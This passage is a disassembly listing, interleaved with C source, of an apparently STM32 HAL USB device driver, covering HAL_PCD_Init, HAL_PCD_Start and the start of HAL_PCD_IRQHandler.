 8001bfa:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001bfe:	4770      	bx	lr

08001c00 <HAL_PCD_Init>:
  *         parameters in the PCD_InitTypeDef and initialize the associated handle.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Init(PCD_HandleTypeDef *hpcd)
{
 8001c00:	b5f0      	push	{r4, r5, r6, r7, lr}
 8001c02:	b08b      	sub	sp, #44	; 0x2c
 8001c04:	af06      	add	r7, sp, #24
 8001c06:	6078      	str	r0, [r7, #4]
  USB_OTG_GlobalTypeDef *USBx;
#endif /* defined (USB_OTG_FS) */
  uint8_t i;

  /* Check the PCD handle allocation */
  if (hpcd == NULL)
 8001c08:	687b      	ldr	r3, [r7, #4]
 8001c0a:	2b00      	cmp	r3, #0
 8001c0c:	d101      	bne.n	8001c12 <HAL_PCD_Init+0x12>
  {
    return HAL_ERROR;
 8001c0e:	2301      	movs	r3, #1
 8001c10:	e0f8      	b.n	8001e04 <HAL_PCD_Init+0x204>

#if defined (USB_OTG_FS)
  USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  if (hpcd->State == HAL_PCD_STATE_RESET)
 8001c12:	687b      	ldr	r3, [r7, #4]
 8001c14:	f893 32a9 	ldrb.w	r3, [r3, #681]	; 0x2a9
 8001c18:	b2db      	uxtb	r3, r3
 8001c1a:	2b00      	cmp	r3, #0
 8001c1c:	d106      	bne.n	8001c2c <HAL_PCD_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    hpcd->Lock = HAL_UNLOCKED;
 8001c1e:	687b      	ldr	r3, [r7, #4]
 8001c20:	2200      	movs	r2, #0
 8001c22:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

    /* Init the low level hardware */
    hpcd->MspInitCallback(hpcd);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_PCD_MspInit(hpcd);
 8001c26:	6878      	ldr	r0, [r7, #4]
 8001c28:	f00a fde4 	bl	800c7f4 <HAL_PCD_MspInit>
#endif /* (USE_HAL_PCD_REGISTER_CALLBACKS) */
  }

  hpcd->State = HAL_PCD_STATE_BUSY;
 8001c2c:	687b      	ldr	r3, [r7, #4]
 8001c2e:	2203      	movs	r2, #3
 8001c30:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    hpcd->Init.dma_enable = 0U;
  }
#endif /* defined (USB_OTG_FS) */

  /* Disable the Interrupts */
  __HAL_PCD_DISABLE(hpcd);
 8001c34:	687b      	ldr	r3, [r7, #4]
 8001c36:	681b      	ldr	r3, [r3, #0]
 8001c38:	4618      	mov	r0, r3
 8001c3a:	f004 f8d4 	bl	8005de6 <USB_DisableGlobalInt>

  /*Init the Core (common init.) */
  if (USB_CoreInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001c3e:	687b      	ldr	r3, [r7, #4]
 8001c40:	681b      	ldr	r3, [r3, #0]
 8001c42:	603b      	str	r3, [r7, #0]
 8001c44:	687e      	ldr	r6, [r7, #4]
 8001c46:	466d      	mov	r5, sp
 8001c48:	f106 0410 	add.w	r4, r6, #16
 8001c4c:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001c4e:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001c50:	6823      	ldr	r3, [r4, #0]
 8001c52:	602b      	str	r3, [r5, #0]
 8001c54:	1d33      	adds	r3, r6, #4
 8001c56:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001c58:	6838      	ldr	r0, [r7, #0]
 8001c5a:	f004 f89c 	bl	8005d96 <USB_CoreInit>
 8001c5e:	4603      	mov	r3, r0
 8001c60:	2b00      	cmp	r3, #0
 8001c62:	d005      	beq.n	8001c70 <HAL_PCD_Init+0x70>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001c64:	687b      	ldr	r3, [r7, #4]
 8001c66:	2202      	movs	r2, #2
 8001c68:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001c6c:	2301      	movs	r3, #1
 8001c6e:	e0c9      	b.n	8001e04 <HAL_PCD_Init+0x204>
  }

  /* Force Device Mode*/
  (void)USB_SetCurrentMode(hpcd->Instance, USB_DEVICE_MODE);
 8001c70:	687b      	ldr	r3, [r7, #4]
 8001c72:	681b      	ldr	r3, [r3, #0]
 8001c74:	2100      	movs	r1, #0
 8001c76:	4618      	mov	r0, r3
 8001c78:	f004 f8d0 	bl	8005e1c <USB_SetCurrentMode>

  /* Init endpoints structures */
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001c7c:	2300      	movs	r3, #0
 8001c7e:	73fb      	strb	r3, [r7, #15]
 8001c80:	e040      	b.n	8001d04 <HAL_PCD_Init+0x104>
  {
    /* Init ep structure */
    hpcd->IN_ep[i].is_in = 1U;
 8001c82:	7bfb      	ldrb	r3, [r7, #15]
 8001c84:	6879      	ldr	r1, [r7, #4]
 8001c86:	1c5a      	adds	r2, r3, #1
 8001c88:	4613      	mov	r3, r2
 8001c8a:	009b      	lsls	r3, r3, #2
 8001c8c:	4413      	add	r3, r2
 8001c8e:	00db      	lsls	r3, r3, #3
 8001c90:	440b      	add	r3, r1
 8001c92:	3301      	adds	r3, #1
 8001c94:	2201      	movs	r2, #1
 8001c96:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].num = i;
 8001c98:	7bfb      	ldrb	r3, [r7, #15]
 8001c9a:	6879      	ldr	r1, [r7, #4]
 8001c9c:	1c5a      	adds	r2, r3, #1
 8001c9e:	4613      	mov	r3, r2
 8001ca0:	009b      	lsls	r3, r3, #2
 8001ca2:	4413      	add	r3, r2
 8001ca4:	00db      	lsls	r3, r3, #3
 8001ca6:	440b      	add	r3, r1
 8001ca8:	7bfa      	ldrb	r2, [r7, #15]
 8001caa:	701a      	strb	r2, [r3, #0]
#if defined (USB_OTG_FS)
    hpcd->IN_ep[i].tx_fifo_num = i;
#endif /* defined (USB_OTG_FS) */
    /* Control until ep is activated */
    hpcd->IN_ep[i].type = EP_TYPE_CTRL;
 8001cac:	7bfb      	ldrb	r3, [r7, #15]
 8001cae:	6879      	ldr	r1, [r7, #4]
 8001cb0:	1c5a      	adds	r2, r3, #1
 8001cb2:	4613      	mov	r3, r2
 8001cb4:	009b      	lsls	r3, r3, #2
 8001cb6:	4413      	add	r3, r2
 8001cb8:	00db      	lsls	r3, r3, #3
 8001cba:	440b      	add	r3, r1
 8001cbc:	3303      	adds	r3, #3
 8001cbe:	2200      	movs	r2, #0
 8001cc0:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].maxpacket = 0U;
 8001cc2:	7bfa      	ldrb	r2, [r7, #15]
 8001cc4:	6879      	ldr	r1, [r7, #4]
 8001cc6:	4613      	mov	r3, r2
 8001cc8:	009b      	lsls	r3, r3, #2
 8001cca:	4413      	add	r3, r2
 8001ccc:	00db      	lsls	r3, r3, #3
 8001cce:	440b      	add	r3, r1
 8001cd0:	3338      	adds	r3, #56	; 0x38
 8001cd2:	2200      	movs	r2, #0
 8001cd4:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_buff = 0U;
 8001cd6:	7bfa      	ldrb	r2, [r7, #15]
 8001cd8:	6879      	ldr	r1, [r7, #4]
 8001cda:	4613      	mov	r3, r2
 8001cdc:	009b      	lsls	r3, r3, #2
 8001cde:	4413      	add	r3, r2
 8001ce0:	00db      	lsls	r3, r3, #3
 8001ce2:	440b      	add	r3, r1
 8001ce4:	333c      	adds	r3, #60	; 0x3c
 8001ce6:	2200      	movs	r2, #0
 8001ce8:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_len = 0U;
 8001cea:	7bfa      	ldrb	r2, [r7, #15]
 8001cec:	6879      	ldr	r1, [r7, #4]
 8001cee:	4613      	mov	r3, r2
 8001cf0:	009b      	lsls	r3, r3, #2
 8001cf2:	4413      	add	r3, r2
 8001cf4:	00db      	lsls	r3, r3, #3
 8001cf6:	440b      	add	r3, r1
 8001cf8:	3340      	adds	r3, #64	; 0x40
 8001cfa:	2200      	movs	r2, #0
 8001cfc:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001cfe:	7bfb      	ldrb	r3, [r7, #15]
 8001d00:	3301      	adds	r3, #1
 8001d02:	73fb      	strb	r3, [r7, #15]
 8001d04:	7bfa      	ldrb	r2, [r7, #15]
 8001d06:	687b      	ldr	r3, [r7, #4]
 8001d08:	685b      	ldr	r3, [r3, #4]
 8001d0a:	429a      	cmp	r2, r3
 8001d0c:	d3b9      	bcc.n	8001c82 <HAL_PCD_Init+0x82>
  }

  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001d0e:	2300      	movs	r3, #0
 8001d10:	73fb      	strb	r3, [r7, #15]
 8001d12:	e044      	b.n	8001d9e <HAL_PCD_Init+0x19e>
  {
    hpcd->OUT_ep[i].is_in = 0U;
 8001d14:	7bfa      	ldrb	r2, [r7, #15]
 8001d16:	6879      	ldr	r1, [r7, #4]
 8001d18:	4613      	mov	r3, r2
 8001d1a:	009b      	lsls	r3, r3, #2
 8001d1c:	4413      	add	r3, r2
 8001d1e:	00db      	lsls	r3, r3, #3
 8001d20:	440b      	add	r3, r1
 8001d22:	f203 1369 	addw	r3, r3, #361	; 0x169
 8001d26:	2200      	movs	r2, #0
 8001d28:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].num = i;
 8001d2a:	7bfa      	ldrb	r2, [r7, #15]
 8001d2c:	6879      	ldr	r1, [r7, #4]
 8001d2e:	4613      	mov	r3, r2
 8001d30:	009b      	lsls	r3, r3, #2
 8001d32:	4413      	add	r3, r2
 8001d34:	00db      	lsls	r3, r3, #3
 8001d36:	440b      	add	r3, r1
 8001d38:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8001d3c:	7bfa      	ldrb	r2, [r7, #15]
 8001d3e:	701a      	strb	r2, [r3, #0]
    /* Control until ep is activated */
    hpcd->OUT_ep[i].type = EP_TYPE_CTRL;
 8001d40:	7bfa      	ldrb	r2, [r7, #15]
 8001d42:	6879      	ldr	r1, [r7, #4]
 8001d44:	4613      	mov	r3, r2
 8001d46:	009b      	lsls	r3, r3, #2
 8001d48:	4413      	add	r3, r2
 8001d4a:	00db      	lsls	r3, r3, #3
 8001d4c:	440b      	add	r3, r1
 8001d4e:	f203 136b 	addw	r3, r3, #363	; 0x16b
 8001d52:	2200      	movs	r2, #0
 8001d54:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].maxpacket = 0U;
 8001d56:	7bfa      	ldrb	r2, [r7, #15]
 8001d58:	6879      	ldr	r1, [r7, #4]
 8001d5a:	4613      	mov	r3, r2
 8001d5c:	009b      	lsls	r3, r3, #2
 8001d5e:	4413      	add	r3, r2
 8001d60:	00db      	lsls	r3, r3, #3
 8001d62:	440b      	add	r3, r1
 8001d64:	f503 73bc 	add.w	r3, r3, #376	; 0x178
 8001d68:	2200      	movs	r2, #0
 8001d6a:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_buff = 0U;
 8001d6c:	7bfa      	ldrb	r2, [r7, #15]
 8001d6e:	6879      	ldr	r1, [r7, #4]
 8001d70:	4613      	mov	r3, r2
 8001d72:	009b      	lsls	r3, r3, #2
 8001d74:	4413      	add	r3, r2
 8001d76:	00db      	lsls	r3, r3, #3
 8001d78:	440b      	add	r3, r1
 8001d7a:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 8001d7e:	2200      	movs	r2, #0
 8001d80:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_len = 0U;
 8001d82:	7bfa      	ldrb	r2, [r7, #15]
 8001d84:	6879      	ldr	r1, [r7, #4]
 8001d86:	4613      	mov	r3, r2
 8001d88:	009b      	lsls	r3, r3, #2
 8001d8a:	4413      	add	r3, r2
 8001d8c:	00db      	lsls	r3, r3, #3
 8001d8e:	440b      	add	r3, r1
 8001d90:	f503 73c0 	add.w	r3, r3, #384	; 0x180
 8001d94:	2200      	movs	r2, #0
 8001d96:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001d98:	7bfb      	ldrb	r3, [r7, #15]
 8001d9a:	3301      	adds	r3, #1
 8001d9c:	73fb      	strb	r3, [r7, #15]
 8001d9e:	7bfa      	ldrb	r2, [r7, #15]
 8001da0:	687b      	ldr	r3, [r7, #4]
 8001da2:	685b      	ldr	r3, [r3, #4]
 8001da4:	429a      	cmp	r2, r3
 8001da6:	d3b5      	bcc.n	8001d14 <HAL_PCD_Init+0x114>
  }

  /* Init Device */
  if (USB_DevInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001da8:	687b      	ldr	r3, [r7, #4]
 8001daa:	681b      	ldr	r3, [r3, #0]
 8001dac:	603b      	str	r3, [r7, #0]
 8001dae:	687e      	ldr	r6, [r7, #4]
 8001db0:	466d      	mov	r5, sp
 8001db2:	f106 0410 	add.w	r4, r6, #16
 8001db6:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001db8:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001dba:	6823      	ldr	r3, [r4, #0]
 8001dbc:	602b      	str	r3, [r5, #0]
 8001dbe:	1d33      	adds	r3, r6, #4
 8001dc0:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001dc2:	6838      	ldr	r0, [r7, #0]
 8001dc4:	f004 f837 	bl	8005e36 <USB_DevInit>
 8001dc8:	4603      	mov	r3, r0
 8001dca:	2b00      	cmp	r3, #0
 8001dcc:	d005      	beq.n	8001dda <HAL_PCD_Init+0x1da>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001dce:	687b      	ldr	r3, [r7, #4]
 8001dd0:	2202      	movs	r2, #2
 8001dd2:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001dd6:	2301      	movs	r3, #1
 8001dd8:	e014      	b.n	8001e04 <HAL_PCD_Init+0x204>
  }

  hpcd->USB_Address = 0U;
 8001dda:	687b      	ldr	r3, [r7, #4]
 8001ddc:	2200      	movs	r2, #0
 8001dde:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  hpcd->State = HAL_PCD_STATE_READY;
 8001de2:	687b      	ldr	r3, [r7, #4]
 8001de4:	2201      	movs	r2, #1
 8001de6:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9

  /* Activate LPM */
  if (hpcd->Init.lpm_enable == 1U)
 8001dea:	687b      	ldr	r3, [r7, #4]
 8001dec:	69db      	ldr	r3, [r3, #28]
 8001dee:	2b01      	cmp	r3, #1
 8001df0:	d102      	bne.n	8001df8 <HAL_PCD_Init+0x1f8>
  {
    (void)HAL_PCDEx_ActivateLPM(hpcd);
 8001df2:	6878      	ldr	r0, [r7, #4]
 8001df4:	f001 fc9e 	bl	8003734 <HAL_PCDEx_ActivateLPM>
  }

  (void)USB_DevDisconnect(hpcd->Instance);
 8001df8:	687b      	ldr	r3, [r7, #4]
 8001dfa:	681b      	ldr	r3, [r3, #0]
 8001dfc:	4618      	mov	r0, r3
 8001dfe:	f006 fadf 	bl	80083c0 <USB_DevDisconnect>

  return HAL_OK;
 8001e02:	2300      	movs	r3, #0
}
 8001e04:	4618      	mov	r0, r3
 8001e06:	3714      	adds	r7, #20
 8001e08:	46bd      	mov	sp, r7
 8001e0a:	bdf0      	pop	{r4, r5, r6, r7, pc}

08001e0c <HAL_PCD_Start>:
  * @brief  Start the USB device
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Start(PCD_HandleTypeDef *hpcd)
{
 8001e0c:	b580      	push	{r7, lr}
 8001e0e:	b082      	sub	sp, #8
 8001e10:	af00      	add	r7, sp, #0
 8001e12:	6078      	str	r0, [r7, #4]
#if defined (USB_OTG_FS)
  USB_OTG_GlobalTypeDef *USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  __HAL_LOCK(hpcd);
 8001e14:	687b      	ldr	r3, [r7, #4]
 8001e16:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8001e1a:	2b01      	cmp	r3, #1
 8001e1c:	d101      	bne.n	8001e22 <HAL_PCD_Start+0x16>
 8001e1e:	2302      	movs	r3, #2
 8001e20:	e012      	b.n	8001e48 <HAL_PCD_Start+0x3c>
 8001e22:	687b      	ldr	r3, [r7, #4]
 8001e24:	2201      	movs	r2, #1
 8001e26:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  {
    /* Enable USB Transceiver */
    USBx->GCCFG |= USB_OTG_GCCFG_PWRDWN;
  }
#endif /* defined (USB_OTG_FS) */
  __HAL_PCD_ENABLE(hpcd);
 8001e2a:	687b      	ldr	r3, [r7, #4]
 8001e2c:	681b      	ldr	r3, [r3, #0]
 8001e2e:	4618      	mov	r0, r3
 8001e30:	f003 ffc2 	bl	8005db8 <USB_EnableGlobalInt>
  (void)USB_DevConnect(hpcd->Instance);
 8001e34:	687b      	ldr	r3, [r7, #4]
 8001e36:	681b      	ldr	r3, [r3, #0]
 8001e38:	4618      	mov	r0, r3
 8001e3a:	f006 faaa 	bl	8008392 <USB_DevConnect>
  __HAL_UNLOCK(hpcd);
 8001e3e:	687b      	ldr	r3, [r7, #4]
 8001e40:	2200      	movs	r2, #0
 8001e42:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8001e46:	2300      	movs	r3, #0
}
 8001e48:	4618      	mov	r0, r3
 8001e4a:	3708      	adds	r7, #8
 8001e4c:	46bd      	mov	sp, r7
 8001e4e:	bd80      	pop	{r7, pc}

08001e50 <HAL_PCD_IRQHandler>:
  * @brief  This function handles PCD interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
void HAL_PCD_IRQHandler(PCD_HandleTypeDef *hpcd)
{
 8001e50:	b580      	push	{r7, lr}
 8001e52:	b084      	sub	sp, #16
 8001e54:	af00      	add	r7, sp, #0
 8001e56:	6078      	str	r0, [r7, #4]
  uint32_t wIstr = USB_ReadInterrupts(hpcd->Instance);
 8001e58:	687b      	ldr	r3, [r7, #4]
 8001e5a:	681b      	ldr	r3, [r3, #0]
 8001e5c:	4618      	mov	r0, r3
 8001e5e:	f006 fac4 	bl	80083ea <USB_ReadInterrupts>
 8001e62:	60f8      	str	r0, [r7, #12]

  if ((wIstr & USB_ISTR_CTR) == USB_ISTR_CTR)
 8001e64:	68fb      	ldr	r3, [r7, #12]
 8001e66:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 8001e6a:	2b00      	cmp	r3, #0
 8001e6c:	d003      	beq.n	8001e76 <HAL_PCD_IRQHandler+0x26>
  {
    /* servicing of the endpoint correct transfer interrupt */
    /* clear of the CTR flag into the sub */
    (void)PCD_EP_ISR_Handler(hpcd);
 8001e6e:	6878      	ldr	r0, [r7, #4]
 8001e70:	f000 fb59 	bl	8002526 <PCD_EP_ISR_Handler>

    return;
 8001e74:	e110      	b.n	8002098 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_RESET) == USB_ISTR_RESET)
 8001e76:	68fb      	ldr	r3, [r7, #12]
 8001e78:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001e7c:	2b00      	cmp	r3, #0
 8001e7e:	d013      	beq.n	8001ea8 <HAL_PCD_IRQHandler+0x58>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_RESET);
 8001e80:	687b      	ldr	r3, [r7, #4]
 8001e82:	681b      	ldr	r3, [r3, #0]
 8001e84:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001e88:	b29a      	uxth	r2, r3
 8001e8a:	687b      	ldr	r3, [r7, #4]
 8001e8c:	681b      	ldr	r3, [r3, #0]
 8001e8e:	f422 6280 	bic.w	r2, r2, #1024	; 0x400
 8001e92:	b292      	uxth	r2, r2
 8001e94:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResetCallback(hpcd);
#else
    HAL_PCD_ResetCallback(hpcd);
 8001e98:	6878      	ldr	r0, [r7, #4]
 8001e9a:	f00a fd4c 	bl	800c936 <HAL_PCD_ResetCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    (void)HAL_PCD_SetAddress(hpcd, 0U);
 8001e9e:	2100      	movs	r1, #0
 8001ea0:	6878      	ldr	r0, [r7, #4]
 8001ea2:	f000 f8fc 	bl	800209e <HAL_PCD_SetAddress>

    return;
 8001ea6:	e0f7      	b.n	8002098 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_PMAOVR) == USB_ISTR_PMAOVR)
 8001ea8:	68fb      	ldr	r3, [r7, #12]
 8001eaa:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8001eae:	2b00      	cmp	r3, #0
 8001eb0:	d00c      	beq.n	8001ecc <HAL_PCD_IRQHandler+0x7c>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_PMAOVR);
 8001eb2:	687b      	ldr	r3, [r7, #4]
 8001eb4:	681b      	ldr	r3, [r3, #0]
 8001eb6:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001eba:	b29a      	uxth	r2, r3
 8001ebc:	687b      	ldr	r3, [r7, #4]
 8001ebe:	681b      	ldr	r3, [r3, #0]
 8001ec0:	f422 4280 	bic.w	r2, r2, #16384	; 0x4000
 8001ec4:	b292      	uxth	r2, r2
 8001ec6:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001eca:	e0e5      	b.n	8002098 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ERR) == USB_ISTR_ERR)
 8001ecc:	68fb      	ldr	r3, [r7, #12]
 8001ece:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 8001ed2:	2b00      	cmp	r3, #0
 8001ed4:	d00c      	beq.n	8001ef0 <HAL_PCD_IRQHandler+0xa0>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ERR);
 8001ed6:	687b      	ldr	r3, [r7, #4]
 8001ed8:	681b      	ldr	r3, [r3, #0]
 8001eda:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001ede:	b29a      	uxth	r2, r3
 8001ee0:	687b      	ldr	r3, [r7, #4]
 8001ee2:	681b      	ldr	r3, [r3, #0]
 8001ee4:	f422 5200 	bic.w	r2, r2, #8192	; 0x2000
 8001ee8:	b292      	uxth	r2, r2
 8001eea:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001eee:	e0d3      	b.n	8002098 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_WKUP) == USB_ISTR_WKUP)
 8001ef0:	68fb      	ldr	r3, [r7, #12]
 8001ef2:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8001ef6:	2b00      	cmp	r3, #0
 8001ef8:	d034      	beq.n	8001f64 <HAL_PCD_IRQHandler+0x114>
  {
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_LPMODE);
 8001efa:	687b      	ldr	r3, [r7, #4]
 8001efc:	681b      	ldr	r3, [r3, #0]
 8001efe:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f02:	b29a      	uxth	r2, r3
 8001f04:	687b      	ldr	r3, [r7, #4]
 8001f06:	681b      	ldr	r3, [r3, #0]
 8001f08:	f022 0204 	bic.w	r2, r2, #4
 8001f0c:	b292      	uxth	r2, r2
 8001f0e:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_FSUSP);
 8001f12:	687b      	ldr	r3, [r7, #4]
 8001f14:	681b      	ldr	r3, [r3, #0]
 8001f16:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f1a:	b29a      	uxth	r2, r3
 8001f1c:	687b      	ldr	r3, [r7, #4]
 8001f1e:	681b      	ldr	r3, [r3, #0]
 8001f20:	f022 0208 	bic.w	r2, r2, #8
 8001f24:	b292      	uxth	r2, r2
 8001f26:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    if (hpcd->LPM_State == LPM_L1)
 8001f2a:	687b      	ldr	r3, [r7, #4]
 8001f2c:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8001f30:	2b01      	cmp	r3, #1
 8001f32:	d107      	bne.n	8001f44 <HAL_PCD_IRQHandler+0xf4>
    {
      hpcd->LPM_State = LPM_L0;
 8001f34:	687b      	ldr	r3, [r7, #4]
 8001f36:	2200      	movs	r2, #0
 8001f38:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L0_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L0_ACTIVE);
 8001f3c:	2100      	movs	r1, #0
 8001f3e:	6878      	ldr	r0, [r7, #4]
 8001f40:	f00a ffd6 	bl	800cef0 <HAL_PCDEx_LPM_Callback>
    }

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResumeCallback(hpcd);
#else
    HAL_PCD_ResumeCallback(hpcd);
 8001f44:	6878      	ldr	r0, [r7, #4]
 8001f46:	f00a fd2f 	bl	800c9a8 <HAL_PCD_ResumeCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_WKUP);
 8001f4a:	687b      	ldr	r3, [r7, #4]
 8001f4c:	681b      	ldr	r3, [r3, #0]
 8001f4e:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001f52:	b29a      	uxth	r2, r3
 8001f54:	687b      	ldr	r3, [r7, #4]
 8001f56:	681b      	ldr	r3, [r3, #0]
 8001f58:	f422 5280 	bic.w	r2, r2, #4096	; 0x1000
 8001f5c:	b292      	uxth	r2, r2
 8001f5e:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001f62:	e099      	b.n	8002098 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SUSP) == USB_ISTR_SUSP)
 8001f64:	68fb      	ldr	r3, [r7, #12]
 8001f66:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8001f6a:	2b00      	cmp	r3, #0
 8001f6c:	d027      	beq.n	8001fbe <HAL_PCD_IRQHandler+0x16e>
  {
    /* Force low-power mode in the macrocell */
    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 8001f6e:	687b      	ldr	r3, [r7, #4]
 8001f70:	681b      	ldr	r3, [r3, #0]
 8001f72:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f76:	b29a      	uxth	r2, r3
 8001f78:	687b      	ldr	r3, [r7, #4]
 8001f7a:	681b      	ldr	r3, [r3, #0]
 8001f7c:	f042 0208 	orr.w	r2, r2, #8
 8001f80:	b292      	uxth	r2, r2
 8001f82:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    /* clear of the ISTR bit must be done after setting of CNTR_FSUSP */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SUSP);
 8001f86:	687b      	ldr	r3, [r7, #4]
 8001f88:	681b      	ldr	r3, [r3, #0]
 8001f8a:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001f8e:	b29a      	uxth	r2, r3
 8001f90:	687b      	ldr	r3, [r7, #4]
 8001f92:	681b      	ldr	r3, [r3, #0]
 8001f94:	f422 6200 	bic.w	r2, r2, #2048	; 0x800
 8001f98:	b292      	uxth	r2, r2
 8001f9a:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 8001f9e:	687b      	ldr	r3, [r7, #4]
 8001fa0:	681b      	ldr	r3, [r3, #0]
 8001fa2:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001fa6:	b29a      	uxth	r2, r3
 8001fa8:	687b      	ldr	r3, [r7, #4]
 8001faa:	681b      	ldr	r3, [r3, #0]
 8001fac:	f042 0204 	orr.w	r2, r2, #4
 8001fb0:	b292      	uxth	r2, r2
 8001fb2:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SuspendCallback(hpcd);
#else
    HAL_PCD_SuspendCallback(hpcd);
 8001fb6:	6878      	ldr	r0, [r7, #4]
 8001fb8:	f00a fcdc 	bl	800c974 <HAL_PCD_SuspendCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 8001fbc:	e06c      	b.n	8002098 <HAL_PCD_IRQHandler+0x248>
  }

  /* Handle LPM Interrupt */
  if ((wIstr & USB_ISTR_L1REQ) == USB_ISTR_L1REQ)
 8001fbe:	68fb      	ldr	r3, [r7, #12]
 8001fc0:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8001fc4:	2b00      	cmp	r3, #0
 8001fc6:	d040      	beq.n	800204a <HAL_PCD_IRQHandler+0x1fa>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_L1REQ);
 8001fc8:	687b      	ldr	r3, [r7, #4]
 8001fca:	681b      	ldr	r3, [r3, #0]
 8001fcc:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001fd0:	b29a      	uxth	r2, r3
 8001fd2:	687b      	ldr	r3, [r7, #4]
